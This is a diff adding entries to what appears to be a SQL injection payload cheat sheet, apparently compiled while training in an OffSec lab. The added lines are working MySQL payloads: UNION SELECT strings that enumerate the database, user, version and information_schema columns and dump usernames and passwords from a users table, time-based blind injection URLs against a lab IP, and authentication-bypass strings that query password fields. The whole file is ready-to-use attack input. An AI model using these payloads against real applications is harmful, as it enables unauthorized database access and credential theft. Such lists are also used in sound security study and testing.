@@ -123,7 +123,15 @@ Comments:
  WHERE 1=1 AND 1=0#
  WHERE 1=1 AND 1=1--
  WHERE 1=1 AND 1=0--
- ORDER BY 1-- 
+# will fail when the selected column does not exist
+# if 5 columns (fails on 6th)
+%' UNION SELECT database(), user(), @@version, null, null -- //
+' UNION SELECT null, null, database(), user(), @@version  -- //
+' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
+' UNION SELECT null, username, password, description, null FROM users -- //
+http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
+http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
+ ORDER BY 1-- //
  ORDER BY 2-- 
  ORDER BY 3-- 
  ORDER BY 4-- 
@@ -804,6 +812,10 @@ admin' or '1'='1'/*
 admin'or 1=1 or ''='
 admin' or 1=1
 admin' or 1=1--
+admin' or 1=1 in (select @@version)-- //
+' OR 1=1 in (SELECT * FROM users) -- //
+' or 1=1 in (SELECT password FROM users) -- //
+' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
 admin' or 1=1#
 admin' or 1=1/*
 admin') or ('1'='1
